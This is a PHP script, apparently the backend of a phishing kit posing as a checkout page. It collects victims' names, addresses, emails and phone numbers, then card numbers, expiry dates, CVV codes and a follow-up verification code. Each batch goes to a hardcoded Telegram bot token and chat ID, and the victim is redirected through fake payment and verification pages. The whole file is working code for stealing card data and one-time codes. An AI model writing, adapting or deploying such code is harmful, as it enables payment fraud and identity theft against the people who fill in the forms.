<?php




// Your Telegram bot API token
$token = '6077207888:AAFoRT7FtFep_g-tW8P379Nah-KZsTdeW4c';

// Your Telegram chat ID where you want to receive the message
$chat_id = '6261990742';

// Construct the message to send
if(isset($_POST['information'])){
    // Get the form data
$full_name = $_POST['full-name'];
$customer_address = $_POST['customer-address'];
$customer_city = $_POST['customer-city'];
$postal_code = $_POST['postal-code'];
$provinces = $_POST['provinces'];
$email = $_POST['email'];
$customer_phone = $_POST['customer-phone'];

$message = "New order received!\n\nFull Name: $full_name\nAddress: $customer_address, $customer_city, $provinces, $postal_code\nEmail: $email\nPhone: $customer_phone";
header('location:paiment.php');

}
if(isset($_POST['paiment'])){
    $number=$_POST['number'];
    $name=$_POST['name'];
    $expiry=$_POST['expiry'];
    $verification_value =$_POST['verification_value'];
$message = "New payment information received:\n\nNumber: $number\nName: $name\nExpiry: $expiry\nVerification Value: $verification_value";
header('location:Verification.php');

}
if(isset($_POST['verification'])){

$code=$_POST['code'];
$message = "New payment Code received:\n\nCode: $code";

header('location:Verification.php');
}
// URL for the Telegram Bot API
$url = "https://api.telegram.org/bot$token/sendMessage";

// Parameters for the HTTP POST request
$params = array(
    'chat_id' => $chat_id,
    'text' => $message
);

// Send the HTTP POST request to the Telegram Bot API
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

// // Redirect to the payment page
// header('location:paiment.php');

// // information
// if(isset($_POST['information'])){
// die(print_r($_POST));
// $full_name=$_POST['full-name'];
// $customer_address=$_POST['customer-address'];
// $customer_city=$_POST['customer-city'];
// $postal_code=$_POST['postal-code'];
// $provinces=$_POST['provinces'];
// $email=$_POST['email'];
// $customer_phone=$_POST['customer-phone'];
// header('location:paiment.php');
// }
// // paiment
// if(isset($_POST['paiment'])){
// die(print_r($_POST));
// $number=$_POST['number'];
// $name=$_POST['name'];
// $expiry=$_POST['expiry'];
// $verification_value =$_POST['verification_value'];
// header('location:Verification.php');
// }

// // verification
// if(isset($_POST['verification'])){
 
// die(print_r($_POST));
// $code=$_POST['code'];
// header('location:Verification.php');
// }


?>
